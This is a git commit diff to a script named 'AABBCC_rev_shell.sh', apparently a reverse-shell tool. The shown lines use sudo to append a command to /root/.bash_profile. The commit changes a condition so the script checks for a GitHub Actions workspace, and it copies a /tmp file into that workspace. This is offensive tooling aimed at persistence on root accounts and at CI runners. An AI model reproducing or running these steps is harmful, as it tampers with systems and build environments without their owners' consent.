39ca53f484b65fc7bcf1368cde995746b48ed256
189er <108280451+189er@users.noreply.github.com>
2023-08-19 16:03:20 +0800

    Update AABBCC_rev_shell.sh

--- AABBCC_rev_shell.sh
+++ AABBCC_rev_shell.sh
@@ -22,7 +22,7 @@ sudo bash -c 'echo -e "\nls -al /tmp/nu*;">>/root/.bash_profile';
 
 [ "715" == "715" ]  && sleep 1;
 
-[ -z "715" ]  && sleep 2||echo 234691;
+[ -z "${GITHUB_WORKSPACE}" ]  && sleep 2||echo 234691;
 
 # [ ! -z "${GITHUB_WORKSPACE}" ] &&(  
   cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;
